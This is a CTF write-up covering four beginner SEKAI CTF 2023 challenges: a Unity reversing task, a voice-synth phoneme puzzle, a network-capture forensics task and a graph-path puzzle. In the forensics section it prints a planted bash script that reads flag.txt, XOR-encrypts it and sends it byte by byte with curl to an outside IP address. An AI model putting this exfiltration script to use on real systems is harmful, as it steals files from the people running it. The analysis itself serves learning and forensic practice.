# SEKAI CTF Writeups
|   |   |
|---|---|
| Event Details: | https://ctftime.org/event/1923/ |
| Date: | Fri, 25 Aug. 2023, 16:00 UTC — Sun, 27 Aug. 2023, 16:00 UTC  |
| Flag Format: | `SEKAI\{[A-Z0-9]+\}` |

Because this was geared toward more intermediate players, I focused on the one ⭐ (least difficult) challenges.

## Azusawa’s Gacha World
|   |   |
|---|---|
| Category: | Reverse  |
| Tools used: | [ILSpy](https://github.com/icsharpcode/ILSpy/) & [AssetStudioGUI](https://github.com/Perfare/AssetStudio/) 

### Problem Statement

We are given a [dist.zip](https://storage.googleapis.com/sekaictf-2023/azusawa/dist.zip) file to download.

### Initial Discovery
The first thing to note is that it's a Unity game. 

![image](https://github.com/amygurski/sekai-ctf-writeup/assets/49253356/b689bfd1-48e7-4102-87f5-579014e0767a)

We can even run the game and check it out.
![image](https://github.com/amygurski/sekai-ctf-writeup/assets/49253356/4fbe0a93-dbab-4353-b8ef-e88140d8d40e)

### Decompiling the game

I used [ILSpy](https://github.com/icsharpcode/ILSpy/) to decompile the game.

By default, Unity compiles all scripts together into a single file named `Assembly-CSharp.dll`. Open this file in ILSpy so it can decompile it back into C#:

![image](https://github.com/amygurski/sekai-ctf-writeup/assets/49253356/31cdfd67-0620-4bb1-953a-cc5b7e8300b5)

### Inspecting the code
Navigating to the `-` namespace and reading the source code, we see a variable named `flagimage` inside the `UIManager`. That sounds promising!

![image](https://github.com/amygurski/sekai-ctf-writeup/assets/49253356/9a69053c-3a6d-4d70-9784-b821b9c1b684)

Looking at the code further, there is a `DisplayFourStarCharacter` method, which loads a `Texture2D` image:

![image](https://github.com/amygurski/sekai-ctf-writeup/assets/49253356/b1c1a647-ca93-4291-9e7a-9a5c04bd061d)

At this point, I think I'm going to have to do more shenanigans and understanding the code to get the flag, but decided to checkout the assets first.

### Extracting the assets
I used [AssetStudioGUI](https://github.com/Perfare/AssetStudio/) for this. This repo is deprecated so there are probably other tools out there. Simply loaded the folder in AssetStudioGUI (hint: turn off `Debug -> Show Error Messages`) and waited. Once it had extracted the assets, I exported them all to search outside the AssetStudioGUI UI.

### Finding the flag
Looking in the `Texture2D` folder there is a picture called `flag.png` and sure enough it has a flag fitting our format. At this point, I was still sure it would be a red herring, but submitted it and it was correct!

![image](https://github.com/amygurski/sekai-ctf-writeup/assets/49253356/d624505a-77c5-415b-b9ca-bce0b4551a97)

### The flag

![image](https://github.com/amygurski/sekai-ctf-writeup/assets/49253356/4c4f1f38-6e97-4065-ba73-8d99ee2b4d4c)

## I Love This World
|   |   |
|---|---|
| Category: | Misc  |
| Tools used: | python scripting (optional) |

### Problem Statement

We are given an [SVG file](https://github.com/amygurski/sekai-ctf-writeup/blob/main/i-love-this-world/ilovethisworld.svp) to download with this description:

> Vocaloid is a great software to get your computer sing the flag out to you, but what if you can’t afford it? No worries, there are plenty of other free tools you can use. How about — let’s say — this one?

### Initial Discovery

The file is an SVP file. Googling `svp file` one of the 1st results that gomes up in the search has the snippet:

> An SVP file is a Dreamtronics Synthesizer V project. It contains JSON-formatted text used to load a voice synthesizer project in Synthesizer V. 

Ooh, JSON.

Opening the file (I used VSCode with a json-prettifier extension), we see it looks really readable, so lets drill into it further!

![image](https://github.com/amygurski/sekai-ctf-writeup/assets/49253356/0d6c4111-f72b-45b9-a80b-44a41aac1004)

### Rabbit Hole
Searching the file for "S", we see an "SE" in the lyrics.

Throwing together a script to extract the lyrics fields from the json:

```
import json

with open('ilovethisworld.svp',) as f:
    json_data= json.load(f)

notes = json_data.get('library')[0].get('notes')

flag = ''
for note in notes:
    lyric = note.get('lyrics')
    flag += lyric

print(flag)
```

Running this we get `きみをおもうひとのかずだけきみをつくるみらいがあるきみをはくぐむよーなこのSEKAI{がぼくわすきなんだ}`. The end of this matches our flag format!

Thankfully, we a hint came out:
> No romanization or Japanese translation is needed to solve the challenge. The flag you find will satisfy the flag regex. The flag in Japanese is a fake flag.

Few, so this must not be the right place to focus. Back to the drawing board!

fake flag: `SEKAI{がぼくわすきなんだ}`

### Solution is in the phonemes
Looking at the JSON some more, noticed that there were also "phonemes" fields. The first one had "eh f", which would be "f". Then "eh l", which could be "l". 

![image](https://github.com/amygurski/sekai-ctf-writeup/assets/49253356/9f914b18-49f0-423c-b8d5-73f2cd681d31)

Continuing on this path, we get:

```
['eh f', 'eh l', 'ey', 'jh iy', 'k ow l ax n', 'eh s', 'iy', 'k ey', 'ey', 'ay', 'ow p ax n k er l iy b r ae k ih t', 'eh s', 'ow', 'eh m', 'iy', 'w ah n', 'z iy', 'eh f', 'ey', 'aa r', 'ey', 'd ah b ax l y uw', 'ey', 'w ay', 't iy', 'eh m', 'aa r', 'w ah n', 'f ay v', 'eh s', 'iy', 'k y uw', 'y uw', 'iy', 'eh l', 't iy', 'ow', 'ow', 'y uw', 'aa r', 'd iy', 'aa r', 'iy', 'ey', 'eh m', 't iy', 'd iy', 'w ay', 'k l ow s k er l iy b r ae k ih t']
```

The beginning clearly sounds out `flag:sekai{s` so it feels like I'm on the right track.

### Scripting the solution

Trying to make sense of the rest became a bit tedious, so I decided to write a small script, which mapped phonemes to letters, numbers, and symbols, and put question marks in the dictionary where I wasn't sure:

`flag:sekai{s?me??faraway?mr??se?uel???ur?ream??y}`

From there, I could make slightly more educated guesses, e.g. "w ah n" == 1, til I had the completed flag.

** Completed script **

```
import json

phoneme_to_letter = {
        "ey": "a",
        "b iy": "b",
        "c iy": "c",
        "d iy": "d",
        "iy": "e",
        "eh f": "f",
        "jh iy": "g",
        "": "h",
        "ay": "i",
        "": "j",
        "k ey": "k",
        "eh l": "l",
        "eh m": "m",
        "": "n",
        "ow": "o",
        "": "p",
        "k y uw": "q",
        "aa r": "r",
        "eh s": "s",
        "t iy": "t",
        "y uw": "u",
        "": "v",
        "d ah b ax l y uw": "w",
        "": "x",
        "w ay": "y",
        "z iy": "z",
        "w ah n": "1",
        "f ay v": "5",
        "k ow l ax n": ":",
        "ow p ax n k er l iy b r ae k ih t": "{",
        "k l ow s k er l iy b r ae k ih t": "}",
}

with open('ilovethisworld.svp',) as f:
    json_data= json.load(f)

notes = json_data.get('library')[0].get('notes')

flag = ''
for note in notes:
    phoneme = note.get('phonemes')
    if phoneme in phoneme_to_letter:
        flag += phoneme_to_letter[phoneme]
    else:
        flag += '?'

print(flag)
```

### The flag
`sekai{some1zfarawaytmr15sequeltoourdreamtdy}`

## Eval me
|   |   |
|---|---|
| Category: | Forensics |
| Tools used: | Wireshark, python scripting |

### Problem Statement

> I was trying a beginner CTF challenge and successfully solved it. But it didn't give me the flag. Luckily I have this network capture. Can you investigate?

`nc chals.sekai.team 9000`

And a network capture: [capture.pcapng](https://ctf.sekai.team/files/a9488e1e270f54d404ea6a2e2f89805f/capture.pcapng?token=eyJ1c2VyX2lkIjoxMDQsInRlYW1faWQiOjU5LCJmaWxlX2lkIjo0OH0.ZO0-eg.6Xzim2X9sVy46FjohbZZVj6_Sa0)

### Initial discovery - `nc chals.sekai.team 9000`
Connecting we see the CTF challenge that was mentioned in the problem statement. Interacting with it, we see that if we answer correctly, it says "Too slow". So clearly if we are going to solve the challenge, we are going to need to write a script to read in the equation and send back the result. But do we even have to solve this challenge? At this point, I'm not sure!

![image](https://github.com/amygurski/sekai-ctf-writeup/assets/49253356/e8c005c3-2dda-4060-988d-baaa68bfad44)

### Initial discovery - `capture.pcapng`
Opeming the file in Wireshare, and poking around a bit, we see a bunch of HTTP packets which are POST requests with ‘data’ in the body, e.g. the first one is `{“data”: “20”}` followed by 200 responses. 

![image](https://github.com/amygurski/sekai-ctf-writeup/assets/49253356/7eb5978f-290b-4cfe-ac20-9d2941a4c08d)

If there is a trick to extracting these, I didn't figure it out, so I went through manually by timestamp and came up with:

```
20 76 20 01 78 24 45 45 46 15 00 10 00 28 4b 41 19 32 43 00 4e 41 00 0b 2d 05 42 05 2c 0b 19 32 43 2d 04 41 00 0b 2d 05 42 28 52 12 4a 1f 09 6b 4e 00 0f
```

I spent more time than I care to admit trying to turn this into something meaningful or find some other clue in the network capture.

### Solving the CTF challenge within the challenge
After failing to get anywhere else with the network capture, I decided to solve the CTF challenge. If nothing else, it would be fun. Wrote up a script that would read in the equation and send back the correct answer 100 times:

```
import json
from pwn import *

conn = remote('chals.sekai.team',9000)

i = 0

while i < 100:

    input = str(conn.recv())
    print(i)
    print(input)

    # regex to extract equation from input, e.g. 10 / 10 or 1 * 4
    equation = re.findall('[\d]+ [\/\+\-\*] [\d]+', input)[0]

    split_num_sym = re.findall('(\d+|[^ 0-9])', equation)

    operator = split_num_sym[1]
    first = int(split_num_sym[0])
    second = int(split_num_sym[2])

    if operator == '+':
        result = first + second
    elif operator == '-':
        result = first - second
    elif operator == '*':
        result = first * second
    else:
        result = first / second

    conn.sendline(str(result).encode())

    i+=1

response = conn.recv()
print(response)

conn.close()
```

Looping 100 times, we get correct, yay!. But no flag like the problem statement said. Now what!?

![image](https://github.com/amygurski/sekai-ctf-writeup/assets/49253356/5b6ab66b-d7c2-4219-8561-64253d852eeb)

### The twist
But wait, scrolling up, we see something odd happened partway through the 100 times...\

![image](https://github.com/amygurski/sekai-ctf-writeup/assets/49253356/7874b834-5223-41a3-ae1b-4f83ea06ed64)

And looking in the directory, sure enough, we have a new `extract.sh` script:

![image](https://github.com/amygurski/sekai-ctf-writeup/assets/49253356/81eb5759-7da2-459e-876b-c10a6ec3aafd)

### `extract.sh`
Looking at the new script, we see that it reads in some text in flag.txt and encrypts it using an `XOREncypt()` function and a `KEY` which we are helpfully given.

It then sends an HTTP POST request to an address and with a body matching our network capture. So it's all coming together now!

```
#!/bin/bash

FLAG=$(cat flag.txt)

KEY='s3k@1_v3ry_w0w'


# Credit: https://gist.github.com/kaloprominat/8b30cda1c163038e587cee3106547a46
Asc() { printf '%d' "'$1"; }


XOREncrypt(){
    local key="$1" DataIn="$2"
    local ptr DataOut val1 val2 val3

    for (( ptr=0; ptr < ${#DataIn}; ptr++ )); do

        val1=$( Asc "${DataIn:$ptr:1}" )
        val2=$( Asc "${key:$(( ptr % ${#key} )):1}" )

        val3=$(( val1 ^ val2 ))

        DataOut+=$(printf '%02x' "$val3")

    done

    for ((i=0;i<${#DataOut};i+=2)); do
    BYTE=${DataOut:$i:2}
    curl -m 0.5 -X POST -H "Content-Type: application/json" -d "{\"data\":\"$BYTE\"}" http://35.196.65.151:30899/ &>/dev/null
    done
}

XOREncrypt $KEY $FLAG

exit 0
```

### Decrypting the data
We now have the encrypted data and a key, so we just need to reverse the encryption script. Or do we!?

Looking at the credit URL, we see we are helpfully given the decryption script: https://gist.github.com/kaloprominat/8b30cda1c163038e587cee3106547a46

We give it our KEY and TESTSTRING and sure enough we get the flag!

```
#!/bin/bash

KEY='s3k@1_v3ry_w0w'
TESTSTRING='20762001782445454615001000284b41193243004e41000b2d0542052c0b1932432d0441000b2d05422852124a1f096b4e000f'

Asc() { printf '%d' "'$1"; }
HexToDec() { printf '%d' "0x$1"; }

XORDecrypt() {

    local key="$1" DataIn="$2"
    local ptr DataOut val1 val2 val3

    local ptrs
    ptrs=0

    for (( ptr=0; ptr < ${#DataIn}/2; ptr++ )); do

        val1="$( HexToDec "${DataIn:$ptrs:2}" )"
        val2=$( Asc "${key:$(( ptr % ${#key} )):1}" )

        val3=$(( val1 ^ val2 ))

        ptrs=$((ptrs+2))

        DataOut+=$( printf \\$(printf "%o" "$val3") )

    done
    printf '%s' "$DataOut"
}

XORDecrypt $KEY $TESTSTRING #| base64 -D
```

### The flag
`SEKAI{3v4l_g0_8rrrr_8rrrrrrr_8rrrrrrrrrrr_!!!_8483}`

## Wiki Game
|   |   |
|---|--|
| Category: | PPC |
| Tools used: | python scripting, much googling |

## Problem Statement

We are given a nice written problem statement and helpfully an example input file.

## Understanding the problem

We have an directed graph (https://en.wikipedia.org/wiki/Directed_graph) where:
1. Line 1 is the number of test cases.
2. The first line of each test case is the number of vertices (n) and edges (m) respectively.
3. The next m lines describe the graph.
4. The last line of the test case are the source and target vertices.

Our task is to determine for each test case if there is a path path length of 6 or less.

Print "YES" if there is an acceptable path, "NO" if not.

## Writing a solution
The first step was to read in the file, breaking it down into the 4 steps and using the small sample output with only 1 then 2 test cases.

Once that was complete, it was a matter of determining if there was a path from the source to the destination.

I found a python library written for graphs that did this beautifully:

But when I submitted it, I received a Runtime error. I submitted a ticket and found out I couldn't use any python libraries.

## Writing a working solution
At this point, I was tempted to give up, because I really didn't wanna write an algorithm to do this. But I was so close. So I persevered...

The solution I used was mostly this, but giving everything an equal weight and not allowing the other direction (i.e. if an edge is 0 9, it can't go 9 0):

https://www.udacity.com/blog/2021/10/implementing-dijkstras-algorithm-in-python.html

## The flag
`SEKAI{hyp3rL1nk_cha115_4r3_EZ}`

## References
https://www.udacity.com/blog/2021/10/implementing-dijkstras-algorithm-in-python.html
